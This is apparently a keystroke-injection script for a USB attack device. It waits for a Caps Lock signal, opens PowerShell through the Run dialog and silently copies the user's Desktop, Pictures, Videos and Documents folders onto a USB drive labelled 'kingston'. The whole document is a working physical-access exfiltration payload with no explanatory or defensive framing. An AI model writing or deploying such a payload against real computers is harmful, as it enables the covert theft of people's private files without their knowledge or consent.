layout('us');
typingSpeed(0,0);

waitLEDRepeat(CAPS);
press("GUI r");
delay(150);
type("powershell\n");
delay(150);
 
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'kingston' } | select name\n");

type("copy-item $env:userprofile/Desktop -destination $usbpath.name -recurse\n");
type("copy-item $env:userprofile/Pictures -destination $usbpath.name -recurse\n");
type("copy-item $env:userprofile/Videos -destination $usbpath.name -recurse\n");
type("copy-item $env:userprofile/Documents -destination $usbpath.name -recurse\n");

type("exit\n");
